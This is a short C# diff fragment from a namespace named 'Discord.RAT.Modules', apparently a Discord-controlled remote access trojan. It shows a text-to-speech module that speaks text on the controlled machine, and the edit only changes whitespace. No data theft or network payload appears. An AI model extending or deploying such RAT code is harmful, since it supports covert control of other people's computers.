@@ -18,8 +18,9 @@ namespace Discord.RAT.Modules
             {
                 Volume = vol
             };
-
             speak.SpeakAsync(text);
+
+
             await ReplyAsync("Sent!");
         }
     }
